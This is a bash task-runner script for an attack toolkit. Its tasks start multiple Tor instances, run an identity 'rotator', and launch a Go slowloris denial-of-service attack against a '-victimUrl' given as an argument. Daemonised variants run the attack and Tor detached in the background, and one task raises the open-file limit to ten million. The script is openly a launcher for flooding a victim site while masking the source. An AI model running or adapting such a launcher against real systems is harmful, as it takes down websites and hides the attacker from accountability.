#!/usr/bin/env bash

set -eo pipefail

DC="${DC:-exec}"

# If we're running in CI we need to disable TTY allocation for docker-compose
# commands that enable it by default, such as exec and run.
TTY=""
if [[ ! -t 1 ]]; then
    TTY="-T"
fi

# -----------------------------------------------------------------------------
# Helper functions start with _ and aren't listed in this script's help menu.
# -----------------------------------------------------------------------------

function _dc {
    export DOCKER_BUILDKIT=1
    docker-compose ${TTY} "${@}"
}

function _use_env {
    set -o allexport; . .env; set +o allexport
}

# ----------------------------------------------------------------------------

function tor {
    bash multitor.sh
}

function rotator {
    source env/bin/activate
    python rotator.py
}

function slowloris {
    go run cmd/slowloris/main.go -victimUrl="$1"
}

function slowloris_srv {
    cd slowloris
    ulimit -n 10000000
    go run . -victimUrl="$1"
}

function tord {
    setsid bash run.sh tor >/dev/null 2>&1 < /dev/null &
}

function slowlorisd {
    setsid bash run.sh slowloris_srv "$1" >/dev/null 2>&1 < /dev/null &
}

# -----------------------------------------------------------------------------

function help {
    printf "%s <task> [args]\n\nTasks:\n" "${0}"

    compgen -A function | grep -v "^_" | cat -n
}

TIMEFORMAT=$'\nTask completed in %3lR'
time "${@:-help}"
